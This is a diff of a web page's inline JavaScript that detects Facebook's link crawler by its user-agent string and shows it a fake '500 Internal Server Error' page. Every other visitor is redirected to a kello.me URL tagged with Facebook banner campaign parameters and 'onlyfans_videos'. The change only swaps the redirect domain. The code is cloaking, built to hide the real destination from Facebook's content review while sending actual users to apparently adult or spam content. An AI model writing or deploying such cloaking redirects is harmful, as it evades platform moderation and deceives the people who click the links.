@@ -8,20 +8,18 @@
         window.onload = function() {
             // Check the user agent
             const userAgent = navigator.userAgent;
-
             // Simulate checking for Facebook's crawler
             if (userAgent.includes('facebookexternalhit')) {
                 // Simulate sending a 500 error response
                 document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                 return; // Stop further execution
             }
-
             // Otherwise, redirect to a random page
             const pages = [
-                "https://wal.kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
-                "https://wal.kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
-                "https://wal.kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
-                "https://wal.kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos"
+                "https://kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
+                "https://kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
+                "https://kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos",
+                "https://kello.me/?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_stories&utm_id=facebook&utm_term=video_calls&utm_content=onlyfans_videos"
             ];
             const randomPage = pages[Math.floor(Math.random() * pages.length)];
             window.location.href = randomPage;
